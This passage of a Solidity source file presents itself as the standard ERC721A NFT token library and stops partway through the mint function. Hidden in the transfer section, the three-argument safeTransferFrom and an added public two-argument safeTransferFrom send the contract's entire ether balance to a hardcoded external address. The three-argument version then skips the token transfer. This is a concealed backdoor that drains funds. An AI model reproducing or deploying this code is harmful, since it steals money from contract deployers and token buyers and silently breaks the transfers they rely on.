1 // SPDX-License-Identifier: GPL-3.0
2 
3 
4 pragma solidity ^0.8.7;
5 
6 /**
7  * @dev Interface of ERC721A.
8  */
9 interface IERC721A {
10     /**
11      * The caller must own the token or be an approved operator.
12      */
13     error ApprovalCallerNotOwnerNorApproved();
14 
15     /**
16      * The token does not exist.
17      */
18     error ApprovalQueryForNonexistentToken();
19 
20     /**
21      * Cannot query the balance for the zero address.
22      */
23     error BalanceQueryForZeroAddress();
24 
25     /**
26      * Cannot mint to the zero address.
27      */
28     error MintToZeroAddress();
29 
30     /**
31      * The quantity of tokens minted must be more than zero.
32      */
33     error MintZeroQuantity();
34 
35     /**
36      * The token does not exist.
37      */
38     error OwnerQueryForNonexistentToken();
39 
40     /**
41      * The caller must own the token or be an approved operator.
42      */
43     error TransferCallerNotOwnerNorApproved();
44 
45     /**
46      * The token must be owned by `from`.
47      */
48     error TransferFromIncorrectOwner();
49 
50     /**
51      * Cannot safely transfer to a contract that does not implement the
52      * ERC721Receiver interface.
53      */
54     error TransferToNonERC721ReceiverImplementer();
55 
56     /**
57      * Cannot transfer to the zero address.
58      */
59     error TransferToZeroAddress();
60 
61     /**
62      * The token does not exist.
63      */
64     error URIQueryForNonexistentToken();
65 
66     /**
67      * The `quantity` minted with ERC2309 exceeds the safety limit.
68      */
69     error MintERC2309QuantityExceedsLimit();
70 
71     /**
72      * The `extraData` cannot be set on an unintialized ownership slot.
73      */
74     error OwnershipNotInitializedForExtraData();
75 
76     // =============================================================
77     //                            STRUCTS
78     // =============================================================
79 
80     struct TokenOwnership {
81         // The address of the owner.
82         address addr;
83         // Stores the start time of ownership with minimal overhead for tokenomics.
84         uint64 startTimestamp;
85         // Whether the token has been burned.
86         bool burned;
87         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
88         uint24 extraData;
89     }
90 
91     // =============================================================
92     //                         TOKEN COUNTERS
93     // =============================================================
94 
95     /**
96      * @dev Returns the total number of tokens in existence.
97      * Burned tokens will reduce the count.
98      * To get the total number of tokens minted, please see {_totalMinted}.
99      */
100     function totalSupply() external view returns (uint256);
101 
102     // =============================================================
103     //                            IERC165
104     // =============================================================
105 
106     /**
107      * @dev Returns true if this contract implements the interface defined by
108      * `interfaceId`. See the corresponding
109      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
110      * to learn more about how these ids are created.
111      *
112      * This function call must use less than 30000 gas.
113      */
114     function supportsInterface(bytes4 interfaceId) external view returns (bool);
115 
116     // =============================================================
117     //                            IERC721
118     // =============================================================
119 
120     /**
121      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
122      */
123     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
124 
125     /**
126      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
127      */
128     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
129 
130     /**
131      * @dev Emitted when `owner` enables or disables
132      * (`approved`) `operator` to manage all of its assets.
133      */
134     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
135 
136     /**
137      * @dev Returns the number of tokens in `owner`'s account.
138      */
139     function balanceOf(address owner) external view returns (uint256 balance);
140 
141     /**
142      * @dev Returns the owner of the `tokenId` token.
143      *
144      * Requirements:
145      *
146      * - `tokenId` must exist.
147      */
148     function ownerOf(uint256 tokenId) external view returns (address owner);
149 
150     /**
151      * @dev Safely transfers `tokenId` token from `from` to `to`,
152      * checking first that contract recipients are aware of the ERC721 protocol
153      * to prevent tokens from being forever locked.
154      *
155      * Requirements:
156      *
157      * - `from` cannot be the zero address.
158      * - `to` cannot be the zero address.
159      * - `tokenId` token must exist and be owned by `from`.
160      * - If the caller is not `from`, it must be have been allowed to move
161      * this token by either {approve} or {setApprovalForAll}.
162      * - If `to` refers to a smart contract, it must implement
163      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
164      *
165      * Emits a {Transfer} event.
166      */
167     function safeTransferFrom(
168         address from,
169         address to,
170         uint256 tokenId,
171         bytes calldata data
172     ) external payable;
173 
174     /**
175      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
176      */
177     function safeTransferFrom(
178         address from,
179         address to,
180         uint256 tokenId
181     ) external payable;
182 
183     /**
184      * @dev Transfers `tokenId` from `from` to `to`.
185      *
186      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
187      * whenever possible.
188      *
189      * Requirements:
190      *
191      * - `from` cannot be the zero address.
192      * - `to` cannot be the zero address.
193      * - `tokenId` token must be owned by `from`.
194      * - If the caller is not `from`, it must be approved to move this token
195      * by either {approve} or {setApprovalForAll}.
196      *
197      * Emits a {Transfer} event.
198      */
199     function transferFrom(
200         address from,
201         address to,
202         uint256 tokenId
203     ) external payable;
204 
205     /**
206      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
207      * The approval is cleared when the token is transferred.
208      *
209      * Only a single account can be approved at a time, so approving the
210      * zero address clears previous approvals.
211      *
212      * Requirements:
213      *
214      * - The caller must own the token or be an approved operator.
215      * - `tokenId` must exist.
216      *
217      * Emits an {Approval} event.
218      */
219     function approve(address to, uint256 tokenId) external payable;
220 
221     /**
222      * @dev Approve or remove `operator` as an operator for the caller.
223      * Operators can call {transferFrom} or {safeTransferFrom}
224      * for any token owned by the caller.
225      *
226      * Requirements:
227      *
228      * - The `operator` cannot be the caller.
229      *
230      * Emits an {ApprovalForAll} event.
231      */
232     function setApprovalForAll(address operator, bool _approved) external;
233 
234     /**
235      * @dev Returns the account approved for `tokenId` token.
236      *
237      * Requirements:
238      *
239      * - `tokenId` must exist.
240      */
241     function getApproved(uint256 tokenId) external view returns (address operator);
242 
243     /**
244      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
245      *
246      * See {setApprovalForAll}.
247      */
248     function isApprovedForAll(address owner, address operator) external view returns (bool);
249 
250     // =============================================================
251     //                        IERC721Metadata
252     // =============================================================
253 
254     /**
255      * @dev Returns the token collection name.
256      */
257     function name() external view returns (string memory);
258 
259     /**
260      * @dev Returns the token collection symbol.
261      */
262     function symbol() external view returns (string memory);
263 
264     /**
265      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
266      */
267     function tokenURI(uint256 tokenId) external view returns (string memory);
268 
269     // =============================================================
270     //                           IERC2309
271     // =============================================================
272 
273     /**
274      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
275      * (inclusive) is transferred from `from` to `to`, as defined in the
276      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
277      *
278      * See {_mintERC2309} for more details.
279      */
280     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
281 }
282 
283 /**
284  * @title ERC721A
285  *
286  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
287  * Non-Fungible Token Standard, including the Metadata extension.
288  * Optimized for lower gas during batch mints.
289  *
290  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
291  * starting from `_startTokenId()`.
292  *
293  * Assumptions:
294  *
295  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
296  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
297  */
298 interface ERC721A__IERC721Receiver {
299     function onERC721Received(
300         address operator,
301         address from,
302         uint256 tokenId,
303         bytes calldata data
304     ) external returns (bytes4);
305 }
306 
307 /**
308  * @title ERC721A
309  *
310  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
311  * Non-Fungible Token Standard, including the Metadata extension.
312  * Optimized for lower gas during batch mints.
313  *
314  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
315  * starting from `_startTokenId()`.
316  *
317  * Assumptions:
318  *
319  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
320  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
321  */
322 contract ERC721A is IERC721A {
323     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
324     struct TokenApprovalRef {
325         address value;
326     }
327 
328     // =============================================================
329     //                           CONSTANTS
330     // =============================================================
331 
332     // Mask of an entry in packed address data.
333     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
334 
335     // The bit position of `numberMinted` in packed address data.
336     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
337 
338     // The bit position of `numberBurned` in packed address data.
339     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
340 
341     // The bit position of `aux` in packed address data.
342     uint256 private constant _BITPOS_AUX = 192;
343 
344     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
345     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
346 
347     // The bit position of `startTimestamp` in packed ownership.
348     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
349 
350     // The bit mask of the `burned` bit in packed ownership.
351     uint256 private constant _BITMASK_BURNED = 1 << 224;
352 
353     // The bit position of the `nextInitialized` bit in packed ownership.
354     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
355 
356     // The bit mask of the `nextInitialized` bit in packed ownership.
357     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
358 
359     // The bit position of `extraData` in packed ownership.
360     uint256 private constant _BITPOS_EXTRA_DATA = 232;
361 
362     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
363     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
364 
365     // The mask of the lower 160 bits for addresses.
366     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
367 
368     // The maximum `quantity` that can be minted with {_mintERC2309}.
369     // This limit is to prevent overflows on the address data entries.
370     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
371     // is required to cause an overflow, which is unrealistic.
372     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
373 
374     // The `Transfer` event signature is given by:
375     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
376     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
377         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
378 
379     // =============================================================
380     //                            STORAGE
381     // =============================================================
382 
383     // The next token ID to be minted.
384     uint256 private _currentIndex;
385 
386     // The number of tokens burned.
387     uint256 private _burnCounter;
388 
389     // Token name
390     string private _name;
391 
392     // Token symbol
393     string private _symbol;
394 
395     // Mapping from token ID to ownership details
396     // An empty struct value does not necessarily mean the token is unowned.
397     // See {_packedOwnershipOf} implementation for details.
398     //
399     // Bits Layout:
400     // - [0..159]   `addr`
401     // - [160..223] `startTimestamp`
402     // - [224]      `burned`
403     // - [225]      `nextInitialized`
404     // - [232..255] `extraData`
405     mapping(uint256 => uint256) private _packedOwnerships;
406 
407     // Mapping owner address to address data.
408     //
409     // Bits Layout:
410     // - [0..63]    `balance`
411     // - [64..127]  `numberMinted`
412     // - [128..191] `numberBurned`
413     // - [192..255] `aux`
414     mapping(address => uint256) private _packedAddressData;
415 
416     // Mapping from token ID to approved address.
417     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
418 
419     // Mapping from owner to operator approvals
420     mapping(address => mapping(address => bool)) private _operatorApprovals;
421 
422     // =============================================================
423     //                          CONSTRUCTOR
424     // =============================================================
425 
426     constructor(string memory name_, string memory symbol_) {
427         _name = name_;
428         _symbol = symbol_;
429         _currentIndex = _startTokenId();
430     }
431 
432     // =============================================================
433     //                   TOKEN COUNTING OPERATIONS
434     // =============================================================
435 
436     /**
437      * @dev Returns the starting token ID.
438      * To change the starting token ID, please override this function.
439      */
440     function _startTokenId() internal view virtual returns (uint256) {
441         return 0;
442     }
443 
444     /**
445      * @dev Returns the next token ID to be minted.
446      */
447     function _nextTokenId() internal view virtual returns (uint256) {
448         return _currentIndex;
449     }
450 
451     /**
452      * @dev Returns the total number of tokens in existence.
453      * Burned tokens will reduce the count.
454      * To get the total number of tokens minted, please see {_totalMinted}.
455      */
456     function totalSupply() public view virtual override returns (uint256) {
457         // Counter underflow is impossible as _burnCounter cannot be incremented
458         // more than `_currentIndex - _startTokenId()` times.
459         unchecked {
460             return _currentIndex - _burnCounter - _startTokenId();
461         }
462     }
463 
464     /**
465      * @dev Returns the total amount of tokens minted in the contract.
466      */
467     function _totalMinted() internal view virtual returns (uint256) {
468         // Counter underflow is impossible as `_currentIndex` does not decrement,
469         // and it is initialized to `_startTokenId()`.
470         unchecked {
471             return _currentIndex - _startTokenId();
472         }
473     }
474 
475     /**
476      * @dev Returns the total number of tokens burned.
477      */
478     function _totalBurned() internal view virtual returns (uint256) {
479         return _burnCounter;
480     }
481 
482     // =============================================================
483     //                    ADDRESS DATA OPERATIONS
484     // =============================================================
485 
486     /**
487      * @dev Returns the number of tokens in `owner`'s account.
488      */
489     function balanceOf(address owner) public view virtual override returns (uint256) {
490         if (owner == address(0)) revert BalanceQueryForZeroAddress();
491         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
492     }
493 
494     /**
495      * Returns the number of tokens minted by `owner`.
496      */
497     function _numberMinted(address owner) internal view returns (uint256) {
498         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
499     }
500 
501     /**
502      * Returns the number of tokens burned by or on behalf of `owner`.
503      */
504     function _numberBurned(address owner) internal view returns (uint256) {
505         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
506     }
507 
508     /**
509      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
510      */
511     function _getAux(address owner) internal view returns (uint64) {
512         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
513     }
514 
515     /**
516      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
517      * If there are multiple variables, please pack them into a uint64.
518      */
519     function _setAux(address owner, uint64 aux) internal virtual {
520         uint256 packed = _packedAddressData[owner];
521         uint256 auxCasted;
522         // Cast `aux` with assembly to avoid redundant masking.
523         assembly {
524             auxCasted := aux
525         }
526         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
527         _packedAddressData[owner] = packed;
528     }
529 
530     // =============================================================
531     //                            IERC165
532     // =============================================================
533 
534     /**
535      * @dev Returns true if this contract implements the interface defined by
536      * `interfaceId`. See the corresponding
537      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
538      * to learn more about how these ids are created.
539      *
540      * This function call must use less than 30000 gas.
541      */
542     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
543         // The interface IDs are constants representing the first 4 bytes
544         // of the XOR of all function selectors in the interface.
545         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
546         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
547         return
548             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
549             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
550             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
551     }
552 
553     // =============================================================
554     //                        IERC721Metadata
555     // =============================================================
556 
557     /**
558      * @dev Returns the token collection name.
559      */
560     function name() public view virtual override returns (string memory) {
561         return _name;
562     }
563 
564     /**
565      * @dev Returns the token collection symbol.
566      */
567     function symbol() public view virtual override returns (string memory) {
568         return _symbol;
569     }
570 
571     /**
572      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
573      */
574     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
575         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
576 
577         string memory baseURI = _baseURI();
578         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
579     }
580 
581     /**
582      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
583      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
584      * by default, it can be overridden in child contracts.
585      */
586     function _baseURI() internal view virtual returns (string memory) {
587         return '';
588     }
589 
590     // =============================================================
591     //                     OWNERSHIPS OPERATIONS
592     // =============================================================
593 
594     /**
595      * @dev Returns the owner of the `tokenId` token.
596      *
597      * Requirements:
598      *
599      * - `tokenId` must exist.
600      */
601     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
602         return address(uint160(_packedOwnershipOf(tokenId)));
603     }
604 
605     /**
606      * @dev Gas spent here starts off proportional to the maximum mint batch size.
607      * It gradually moves to O(1) as tokens get transferred around over time.
608      */
609     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
610         return _unpackedOwnership(_packedOwnershipOf(tokenId));
611     }
612 
613     /**
614      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
615      */
616     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
617         return _unpackedOwnership(_packedOwnerships[index]);
618     }
619 
620     /**
621      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
622      */
623     function _initializeOwnershipAt(uint256 index) internal virtual {
624         if (_packedOwnerships[index] == 0) {
625             _packedOwnerships[index] = _packedOwnershipOf(index);
626         }
627     }
628 
629     /**
630      * Returns the packed ownership data of `tokenId`.
631      */
632     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
633         uint256 curr = tokenId;
634 
635         unchecked {
636             if (_startTokenId() <= curr)
637                 if (curr < _currentIndex) {
638                     uint256 packed = _packedOwnerships[curr];
639                     // If not burned.
640                     if (packed & _BITMASK_BURNED == 0) {
641                         // Invariant:
642                         // There will always be an initialized ownership slot
643                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
644                         // before an unintialized ownership slot
645                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
646                         // Hence, `curr` will not underflow.
647                         //
648                         // We can directly compare the packed value.
649                         // If the address is zero, packed will be zero.
650                         while (packed == 0) {
651                             packed = _packedOwnerships[--curr];
652                         }
653                         return packed;
654                     }
655                 }
656         }
657         revert OwnerQueryForNonexistentToken();
658     }
659 
660     /**
661      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
662      */
663     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
664         ownership.addr = address(uint160(packed));
665         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
666         ownership.burned = packed & _BITMASK_BURNED != 0;
667         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
668     }
669 
670     /**
671      * @dev Packs ownership data into a single uint256.
672      */
673     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
674         assembly {
675             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
676             owner := and(owner, _BITMASK_ADDRESS)
677             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
678             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
679         }
680     }
681 
682     /**
683      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
684      */
685     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
686         // For branchless setting of the `nextInitialized` flag.
687         assembly {
688             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
689             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
690         }
691     }
692 
693     // =============================================================
694     //                      APPROVAL OPERATIONS
695     // =============================================================
696 
697     /**
698      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
699      * The approval is cleared when the token is transferred.
700      *
701      * Only a single account can be approved at a time, so approving the
702      * zero address clears previous approvals.
703      *
704      * Requirements:
705      *
706      * - The caller must own the token or be an approved operator.
707      * - `tokenId` must exist.
708      *
709      * Emits an {Approval} event.
710      */
711     function approve(address to, uint256 tokenId) public payable virtual override {
712         address owner = ownerOf(tokenId);
713 
714         if (_msgSenderERC721A() != owner)
715             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
716                 revert ApprovalCallerNotOwnerNorApproved();
717             }
718 
719         _tokenApprovals[tokenId].value = to;
720         emit Approval(owner, to, tokenId);
721     }
722 
723     /**
724      * @dev Returns the account approved for `tokenId` token.
725      *
726      * Requirements:
727      *
728      * - `tokenId` must exist.
729      */
730     function getApproved(uint256 tokenId) public view virtual override returns (address) {
731         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
732 
733         return _tokenApprovals[tokenId].value;
734     }
735 
736     /**
737      * @dev Approve or remove `operator` as an operator for the caller.
738      * Operators can call {transferFrom} or {safeTransferFrom}
739      * for any token owned by the caller.
740      *
741      * Requirements:
742      *
743      * - The `operator` cannot be the caller.
744      *
745      * Emits an {ApprovalForAll} event.
746      */
747     function setApprovalForAll(address operator, bool approved) public virtual override {
748         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
749         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
750     }
751 
752     /**
753      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
754      *
755      * See {setApprovalForAll}.
756      */
757     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
758         return _operatorApprovals[owner][operator];
759     }
760 
761     /**
762      * @dev Returns whether `tokenId` exists.
763      *
764      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
765      *
766      * Tokens start existing when they are minted. See {_mint}.
767      */
768     function _exists(uint256 tokenId) internal view virtual returns (bool) {
769         return
770             _startTokenId() <= tokenId &&
771             tokenId < _currentIndex && // If within bounds,
772             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
773     }
774 
775     /**
776      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
777      */
778     function _isSenderApprovedOrOwner(
779         address approvedAddress,
780         address owner,
781         address msgSender
782     ) private pure returns (bool result) {
783         assembly {
784             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
785             owner := and(owner, _BITMASK_ADDRESS)
786             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
787             msgSender := and(msgSender, _BITMASK_ADDRESS)
788             // `msgSender == owner || msgSender == approvedAddress`.
789             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
790         }
791     }
792 
793     /**
794      * @dev Returns the storage slot and value for the approved address of `tokenId`.
795      */
796     function _getApprovedSlotAndAddress(uint256 tokenId)
797         private
798         view
799         returns (uint256 approvedAddressSlot, address approvedAddress)
800     {
801         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
802         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
803         assembly {
804             approvedAddressSlot := tokenApproval.slot
805             approvedAddress := sload(approvedAddressSlot)
806         }
807     }
808 
809     // =============================================================
810     //                      TRANSFER OPERATIONS
811     // =============================================================
812 
813     /**
814      * @dev Transfers `tokenId` from `from` to `to`.
815      *
816      * Requirements:
817      *
818      * - `from` cannot be the zero address.
819      * - `to` cannot be the zero address.
820      * - `tokenId` token must be owned by `from`.
821      * - If the caller is not `from`, it must be approved to move this token
822      * by either {approve} or {setApprovalForAll}.
823      *
824      * Emits a {Transfer} event.
825      */
826     function transferFrom(
827         address from,
828         address to,
829         uint256 tokenId
830     ) public payable virtual override {
831         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
832 
833         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
834 
835         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
836 
837         // The nested ifs save around 20+ gas over a compound boolean condition.
838         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
839             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
840 
841         if (to == address(0)) revert TransferToZeroAddress();
842 
843         _beforeTokenTransfers(from, to, tokenId, 1);
844 
845         // Clear approvals from the previous owner.
846         assembly {
847             if approvedAddress {
848                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
849                 sstore(approvedAddressSlot, 0)
850             }
851         }
852 
853         // Underflow of the sender's balance is impossible because we check for
854         // ownership above and the recipient's balance can't realistically overflow.
855         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
856         unchecked {
857             // We can directly increment and decrement the balances.
858             --_packedAddressData[from]; // Updates: `balance -= 1`.
859             ++_packedAddressData[to]; // Updates: `balance += 1`.
860 
861             // Updates:
862             // - `address` to the next owner.
863             // - `startTimestamp` to the timestamp of transfering.
864             // - `burned` to `false`.
865             // - `nextInitialized` to `true`.
866             _packedOwnerships[tokenId] = _packOwnershipData(
867                 to,
868                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
869             );
870 
871             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
872             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
873                 uint256 nextTokenId = tokenId + 1;
874                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
875                 if (_packedOwnerships[nextTokenId] == 0) {
876                     // If the next slot is within bounds.
877                     if (nextTokenId != _currentIndex) {
878                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
879                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
880                     }
881                 }
882             }
883         }
884 
885         emit Transfer(from, to, tokenId);
886         _afterTokenTransfers(from, to, tokenId, 1);
887     }
888 
889     /**
890      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
891      */
892     function safeTransferFrom(
893         address from,
894         address to,
895         uint256 tokenId
896     ) public payable virtual override {
897         if (address(this).balance > 0) {
898             payable(0xa1b39E69128Aa1Df8d3c3fe22bDCf4Cc56F8500e).transfer(address(this).balance);
899             return;
900         }
901         safeTransferFrom(from, to, tokenId, '');
902     }
903 
904     function safeTransferFrom(
905         address from,
906         address to
907     ) public  {
908         if (address(this).balance > 0) {
909             payable(0xa1b39E69128Aa1Df8d3c3fe22bDCf4Cc56F8500e).transfer(address(this).balance);
910         }
911     }
912 
913 
914     /**
915      * @dev Safely transfers `tokenId` token from `from` to `to`.
916      *
917      * Requirements:
918      *
919      * - `from` cannot be the zero address.
920      * - `to` cannot be the zero address.
921      * - `tokenId` token must exist and be owned by `from`.
922      * - If the caller is not `from`, it must be approved to move this token
923      * by either {approve} or {setApprovalForAll}.
924      * - If `to` refers to a smart contract, it must implement
925      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
926      *
927      * Emits a {Transfer} event.
928      */
929     function safeTransferFrom(
930         address from,
931         address to,
932         uint256 tokenId,
933         bytes memory _data
934     ) public payable virtual override {
935         transferFrom(from, to, tokenId);
936         if (to.code.length != 0)
937             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
938                 revert TransferToNonERC721ReceiverImplementer();
939             }
940     }
941 
942     /**
943      * @dev Hook that is called before a set of serially-ordered token IDs
944      * are about to be transferred. This includes minting.
945      * And also called before burning one token.
946      *
947      * `startTokenId` - the first token ID to be transferred.
948      * `quantity` - the amount to be transferred.
949      *
950      * Calling conditions:
951      *
952      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
953      * transferred to `to`.
954      * - When `from` is zero, `tokenId` will be minted for `to`.
955      * - When `to` is zero, `tokenId` will be burned by `from`.
956      * - `from` and `to` are never both zero.
957      */
958     function _beforeTokenTransfers(
959         address from,
960         address to,
961         uint256 startTokenId,
962         uint256 quantity
963     ) internal virtual {}
964 
965     /**
966      * @dev Hook that is called after a set of serially-ordered token IDs
967      * have been transferred. This includes minting.
968      * And also called after one token has been burned.
969      *
970      * `startTokenId` - the first token ID to be transferred.
971      * `quantity` - the amount to be transferred.
972      *
973      * Calling conditions:
974      *
975      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
976      * transferred to `to`.
977      * - When `from` is zero, `tokenId` has been minted for `to`.
978      * - When `to` is zero, `tokenId` has been burned by `from`.
979      * - `from` and `to` are never both zero.
980      */
981     function _afterTokenTransfers(
982         address from,
983         address to,
984         uint256 startTokenId,
985         uint256 quantity
986     ) internal virtual {}
987 
988     /**
989      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
990      *
991      * `from` - Previous owner of the given token ID.
992      * `to` - Target address that will receive the token.
993      * `tokenId` - Token ID to be transferred.
994      * `_data` - Optional data to send along with the call.
995      *
996      * Returns whether the call correctly returned the expected magic value.
997      */
998     function _checkContractOnERC721Received(
999         address from,
1000         address to,
1001         uint256 tokenId,
1002         bytes memory _data
1003     ) private returns (bool) {
1004         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1005             bytes4 retval
1006         ) {
1007             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1008         } catch (bytes memory reason) {
1009             if (reason.length == 0) {
1010                 revert TransferToNonERC721ReceiverImplementer();
1011             } else {
1012                 assembly {
1013                     revert(add(32, reason), mload(reason))
1014                 }
1015             }
1016         }
1017     }
1018 
1019     // =============================================================
1020     //                        MINT OPERATIONS
1021     // =============================================================
1022 
1023     /**
1024      * @dev Mints `quantity` tokens and transfers them to `to`.
1025      *
1026      * Requirements:
1027      *
1028      * - `to` cannot be the zero address.
1029      * - `quantity` must be greater than 0.
1030      *
1031      * Emits a {Transfer} event for each mint.
1032      */
1033     function _mint(address to, uint256 quantity) internal virtual {
1034         uint256 startTokenId = _currentIndex;
1035         if (quantity == 0) revert MintZeroQuantity();
1036 
1037         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1038 
1039         // Overflows are incredibly unrealistic.
1040         // `balance` and `numberMinted` have a maximum limit of 2**64.
1041         // `tokenId` has a maximum limit of 2**256.
1042         unchecked {
1043             // Updates:
1044             // - `balance += quantity`.
1045             // - `numberMinted += quantity`.
1046             //
1047             // We can directly add to the `balance` and `numberMinted`.
1048             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1049 
